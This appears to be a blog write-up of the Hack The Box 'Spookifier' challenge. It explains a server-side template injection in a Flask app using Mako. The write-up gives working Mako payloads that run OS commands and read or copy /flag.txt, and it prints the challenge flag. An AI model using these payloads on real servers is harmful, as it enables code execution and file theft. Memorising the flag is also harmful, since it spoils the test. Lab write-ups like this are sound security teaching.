---
title: "HTB Challenge: Spookifier - Web Exploitation Writeup"
date: 2025-07-20 00:00:00 +0530
categories: [Hack The Box]
tags: [security]
toc: true
image:
  path: /assets/img/posts/htb/spookifier.png
  alt: Spookifier - Web Exploitation Writeup
pin: false
math: false
mermaid: true
---

## Challenge Information

- **Challenge Name**: Spookifier
- **Platform**: HackTheBox
- **Category**: Web Exploitation
- **Difficulty**: Very Easy
- **URL**: https://app.hackthebox.com/challenges/Spookifier

## Initial Reconnaissance

The web application takes user input and transforms it into a "spookified" version. However, some users reported that their real names were being altered unpredictably, suggesting potential security vulnerabilities in the input processing mechanism.

### Testing for SSTI

To investigate, I started by entering simple test inputs and observing how the application processes them. A common test for Server-Side Template Injection (SSTI) is entering expressions that would be evaluated if the application improperly processes inputs in a templating engine.

**Test Input:** `${1+3}`

If the application evaluates this input and returns `4`, it indicates that the user input is processed as executable code.

**Result:** The application indeed returned `4`, confirming that it was vulnerable to SSTI.

## Source Code Analysis

The application was developed using Flask with the Mako template engine. The key file was `application/blueprints/routes.py`:

```python
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify

web = Blueprint('web', __name__)

@web.route('/')
def index():
    text = request.args.get('text')
    if text:
        converted = spookify(text)
        return render_template('index.html', output=converted)
    
    return render_template('index.html', output='')
```

### Vulnerability Analysis

The application utilized Mako instead of the commonly used Jinja2 template engine. The `spookify` function converts standard characters into spooky-style fonts through a predefined mapping. However, the final transformation step (`font4`) did not modify the string in any way, allowing raw user input to be passed directly to the template.

```python
def change_font(text_list):
    text_list = [*text_list]
    current_font = []
    all_fonts = []
    
    add_font_to_list = lambda text,font_type : (
        [current_font.append(globals()[font_type].get(i, ' ')) for i in text], 
        all_fonts.append(''.join(current_font)), 
        current_font.clear()
    ) and None

    add_font_to_list(text_list, 'font1')
    add_font_to_list(text_list, 'font2')
    add_font_to_list(text_list, 'font3')
    add_font_to_list(text_list, 'font4')  # This doesn't modify the string
    
    return all_fonts

def spookify(text):
    converted_fonts = change_font(text_list=text)
    return generate_render(converted_fonts=converted_fonts)
```

## SSTI Exploitation

### Initial Payload Testing

I tried a common command execution payload:

**Payload:** `${system('cat flag.txt')}`

**Result:** This attempt did not yield the expected output, suggesting that the `system()` function was either restricted or not available in the context of the application.

### Mako-Specific Payload

To exploit server-side template injection, I referred to PayloadsAllTheThings and located a suitable payload for Mako SSTI:

**Payload:** `${self.module.cache.util.os.system("id")}`

**Result:** This command returned `0`, which is the exit code from `os.system`. Since `os.system` does not allow direct reading of the flag, I couldn't retrieve it directly.

### File Operation Exploitation

Since I had code execution, I moved the `/flag.txt` file to a publicly accessible directory:

**Payload:** `${self.module.cache.util.os.system("cp /flag.txt /app/application/static/css")}`

**Result:** Successfully copied the flag file to an accessible location.

## Root Cause Analysis

The vulnerability arose from the application's use of the Mako template engine, which allows dynamic code execution. If user input is not properly sanitized, it can be directly executed within the template, leading to arbitrary code execution.

## Flag Retrieval

To obtain the challenge flag, I executed the following command:

```bash
curl 161.35.174.99:30548/static/css/flag.txt
```

**Flag:** `HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}`

Upon analyzing the application, it was discovered that it is vulnerable to Server-Side Template Injection (SSTI). By inputting specific payloads, an attacker can execute arbitrary commands on the server. For instance, entering `${1+3}` in the input field returns `4`, confirming SSTI vulnerability. Further exploitation using `${open('/flag.txt').read()}` successfully retrieves the flag: `HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}`. This indicates that the application improperly handles user inputs within its template rendering function, leading to potential security breaches.

---